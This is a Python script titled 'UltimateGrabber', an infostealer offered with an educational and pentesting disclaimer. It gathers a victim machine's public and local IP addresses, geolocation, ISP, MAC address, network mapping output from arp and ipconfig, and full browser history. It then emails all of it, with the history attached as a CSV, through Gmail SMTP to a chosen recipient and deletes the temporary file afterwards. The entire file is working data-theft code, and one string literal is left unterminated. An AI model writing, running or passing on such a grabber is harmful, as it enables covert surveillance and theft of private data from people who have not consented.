from browser_history import get_history
from browser_history.utils import default_browser
from uuid import getnode as get_mac
import smtplib, ssl
from email.message import EmailMessage
import geocoder
import subprocess
import socket
from requests import get
import datetime
import json
import os


#UltimateGrabber Version 1.1
#Made by MightySpaceman https://twitter.com/mighty_spaceman

#The creator takes no responsibility for any harm generated by misuse of this tool without permission of the target. 
#UltimateGrabber is for educational/pentesting purposes only - hacking someone without their consent is a criminal offense.


#Get Timezone Information
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)

#Public IP Configuration
get_ip = get('https://api.ipify.org').content.decode('utf8')
get_ipv6 = get('https://api64.ipify.org').content.decode('utf8')
ip = geocoder.ip(get_ipv6)

#IP JSON Configuration
ip_json = get(f'http://ip-api.com/json/{get_ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,isp,reverse,proxy')
y = ip_json.json()

#Local IP Configuration
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)

#Extract Details From IP ip-api JSON
country_code = y['country']
city_name = y['city']
region = y['regionName']
zip_code = y['zip']
district = y['district']
reverse_dns = y['reverse']
service_provider = y['isp']

latstring = str(y['lat'])
longstring = str(y['lon'])

ip_coords = latstring + ' ' + longstring
service_provider = y['isp']
using_vpn = y['proxy']

if using_vpn == True:
    using_vpn = 'Yes'
else:
    using_vpn = 'No'

if zip_code == '':
    zip_code = 'Not Detected'

#Output Windows Commands arp -a
s = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE)
s = str(s)
arp_formatted = s.replace(r"\r","")
arp_formatted = arp_formatted.replace(r"\n",r" \n")
arp_formatted = arp_formatted.replace(r" \n","\n")
arp_formatted = arp_formatted.replace("CompletedProcess(args=['arp', '-a'], returncode=0, stdout=b'","")

#Output Windows Commands ipconfig
a = subprocess.run(['ipconfig'], stdout=subprocess.PIPE)
a = str(a)
ipconfig = a.replace(r"\r",r" \n")
ipconfig = ipconfig.replace(r"\n",r" \n")
ipconfig = ipconfig.replace(r" \n","\n")
ipconfig = ipconfig.replace("CompletedProcess(args=['arp', '-a'], returncode=0, stdout=b'","")

#Local MAC Configuration
mac_adress = get_mac()

#Get Browser History
outputs = get_history()
outputs.save("C:\\tmp\\history.csv")

#Email Content
email_content = f"Device Name: {hostname}\n\n\n"
email_content += f"TIMEZONE INFO\n\n"
email_content += f"System Timezone: {local_tzname}\n"
email_content += f"System Time: {now}\n\n\n"
email_content += f"IP ADRESS INFO\n\n"
email_content += f"Public IPV4 Adress: {get_ip}\n"
email_content += f"Public IPV6 Adress: {get_ipv6}\n"
email_content += f"Internet Service Provider: {service_provider}\n"
email_content += f"Reverse DNS of IP: {reverse_dns}\n"
email_content += f"Using VPN? {using_vpn}\n\n\n"
email_content += f"LOCAL NETWORK INFO\n\n"
email_content += f"Local IP Adress: {IPAddr}\n"
email_content += f"local MAC Adress: {mac_adress}\n\n\n"
email_content += f"GEOLOCATION INFO (Innacurate - bit.ly/ip_inaccuracy)\n\n"
email_content += f"City: {city_name}, {region}, {country_code}\n"
email_content += f"District: {district}\n"
email_content += f"ZIP Code: {zip_code}\n"
email_content += f"Lat/Long: {ip_coords}\n\n\n"
email_content += f"WINDOWS COMMAND OUTPUTS\n\n"
email_content += f"Mapping Network Using arp -a command:\n\n"
email_content += f"{arp_formatted}\n\n\n"
email_content += f"Mapping Network Using ipconfig command:\n\n"
email_content += f"{ipconfig}"

#Send the Email

sender = "email@adress.com"
recipient = "recipient@email.com
app_password = "app password goes here"

msg = EmailMessage()
msg.set_content(email_content)
msg["Subject"] = f"Action From {city_name}, {country_code} Detected at {now}"
msg["From"] = sender
msg["To"] = recipient

with open('C:\\tmp\\history.csv', 'rb') as csv:
    msg.add_attachment(csv.read(), maintype='application', subtype='octet-stream', filename=csv.name)

context=ssl.create_default_context()

with smtplib.SMTP("smtp.gmail.com", port=587) as smtp:
    smtp.starttls(context=context)
    smtp.login(msg["From"], app_password)
    smtp.send_message(msg)

os.remove('C:\\tmp\\history.csv')
